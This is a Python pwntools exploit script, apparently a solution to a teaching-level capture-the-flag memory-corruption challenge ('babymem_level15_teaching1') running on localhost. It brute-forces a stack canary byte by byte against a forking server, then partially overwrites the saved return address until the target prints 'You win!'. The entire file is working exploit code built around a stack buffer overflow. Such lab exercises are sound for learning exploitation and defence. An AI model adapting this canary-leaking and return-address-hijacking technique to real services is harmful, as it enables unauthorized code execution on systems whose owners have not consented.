#!/usr/bin/env python3

from socket import timeout
from pwn import *

FILENAME='/babymem_level15_teaching1'
context.log_level = 'WARNING'

# Run a server program
server = process(FILENAME)

stack_canary = [0x0]
#stack_canary = [0, 36, 60, 245, 151, 95, 122, 101]
byte_val = 0x0

while len(stack_canary) < 8:
    # Create a process
    p = remote('localhost', 1337)

    # Send input
    p.sendline(bytes(str(120 + len(stack_canary) + 1), 'utf-8'))
    
    payload = b'a' * 120
    for element in stack_canary:
        payload += p8(element)
    payload += p8(byte_val)

    p.recvline_startswith(b"Payload size: Send your payload (up to ")
    log.warning('trying stack canary: ' + str(stack_canary + [byte_val]))
    p.send(payload)

    # Check whether stack smashing has happened and run again with different value in that case
    if server.recvline_startswith(b'*** stack smashing detected ***', timeout=1):
        byte_val = 0 if byte_val == 255 else byte_val + 1
    else:
        # Stack canary found: try to find the next byte value
        stack_canary.append(byte_val)
        log.warning('%d bytes stack canary found: ' % len(stack_canary) + str(stack_canary))
        byte_val = 0x0
    
    p.close()

byte_val = 0xa
return_address = [0x9e]

while len(return_address) < 2:
    # Create a process
    p = remote('localhost', 1337)

    # Send input
    p.sendline(bytes(str(136 + len(return_address) + 1), 'utf-8'))
    
    payload = b'a' * 120

    for element in stack_canary:
        payload += p8(element)

    payload += b'a' * 8

    for element in return_address:
        payload += p8(element)
    payload += p8(byte_val)
    
    p.recvline_startswith(b"Payload size: Send your payload (up to ")
    log.warning('trying return address: ' + str(return_address + [byte_val]))
    p.send(payload)

    # Receive data
    if server.recvline_startswith(b'You win!', timeout=1):
        # Return address found: try to find the next byte value
        return_address.append(byte_val)
        log.warning('%d bytes return address found: ' % len(return_address) + str(return_address))
    else:
        # Run again with different value if the return address is invalid
        byte_val = 0xa if byte_val > 255 else byte_val + 16
    
    p.close()

server.interactive()
